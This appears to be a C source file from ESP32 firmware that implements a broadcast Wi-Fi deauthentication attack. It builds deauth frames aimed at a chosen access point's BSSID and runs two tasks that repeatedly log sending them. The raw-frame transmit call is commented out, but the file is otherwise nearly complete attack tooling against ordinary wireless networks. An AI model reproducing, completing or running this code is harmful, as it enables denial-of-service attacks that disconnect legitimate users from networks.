#include "modules/wifi/wifi_attack_brod_module.h"
#include <string.h>
#include "esp_event.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"

bool running_broadcast_attack = false;
int broadcast_attack_task_id = 0;

void wifi_attack_brod_send_deauth_frame(deauth_frame_t* deauth_frame) {
  esp_err_t err;
  while (running_broadcast_attack) {
    ESP_LOGI(TAG_WIFI_ATTACL_BROD_MODULE, "[%d] Sending deauth",
             deauth_frame->task_id);
    // err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame->frame_buffer,
    // deauth_frame->size, false); if(err != ESP_OK){
    //     ESP_LOGE(TAG_WIFI_ATTACL_BROD_MODULE, "Failed to send raw frame: %s",
    //     esp_err_to_name(err)); running_broadcast_attack = false; break;
    // }
    if (deauth_frame->task_id > 0) {
      vTaskDelay(4000 / portTICK_PERIOD_MS);
    } else {
      vTaskDelay(5000 / portTICK_PERIOD_MS);
    }
  }
}

void wifi_attack_brod_create_task(void* pvParameters) {
  wifi_ap_record_t* ap_target = (wifi_ap_record_t*) pvParameters;

  ESP_LOGI(TAG_WIFI_ATTACL_BROD_MODULE, "Starting broadcast attack: %s",
           ap_target->ssid);

  uint8_t deauth_frame[sizeof(deauth_frame_default)];
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  memcpy(&deauth_frame[10], ap_target->bssid, 6);
  memcpy(&deauth_frame[16], ap_target->bssid, 6);

  deauth_frame_t attack_frame = {.frame_buffer = deauth_frame,
                                 .size = sizeof(deauth_frame),
                                 .task_id = broadcast_attack_task_id};
  wifi_attack_brod_send_deauth_frame(&attack_frame);
}

void wifi_attack_brod_module_start(wifi_ap_record_t* ap_target) {
  xTaskCreate(wifi_attack_brod_create_task, "wifi_attack_brod_create_task",
              4096, ap_target, 1, NULL);
  xTaskCreate(wifi_attack_brod_create_task, "wifi_attack_brod_create_task1",
              4096, ap_target, 1, NULL);
  // wifi_attack_brod_send_deauth_frame(deauth_frame);
}
